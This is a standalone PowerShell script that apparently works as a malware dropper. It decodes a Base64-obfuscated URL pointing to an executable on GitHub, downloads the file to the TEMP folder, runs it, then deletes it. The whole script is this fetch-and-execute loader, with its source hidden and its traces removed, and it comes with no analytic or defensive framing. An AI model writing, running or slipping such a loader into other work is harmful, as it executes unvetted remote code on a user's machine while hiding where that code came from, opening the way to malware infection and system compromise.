# Define the URL of the .exe file on GitHub
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"

# Function to decode Base64 string
function Decode-Base64 {
    param (
        [string]$encodedString
    )
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedString))
}

# Decode the URL
$url = Decode-Base64 -encodedString $encodedUrl

# Function to download the file
function DownloadFile {
    param (
        [string]$url
    )
    $output = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($url))
    $client = New-Object System.Net.WebClient
    $client.DownloadFile($url, $output)
    return $output
}

# Function to execute the file
function ExecuteFile {
    param (
        [string]$filePath
    )
    Start-Process -FilePath $filePath -NoNewWindow -Wait
}

# Download the file
$filePath = DownloadFile -url $url

# Execute the file
ExecuteFile -filePath $filePath

# Clean up the file
Remove-Item -Path $filePath
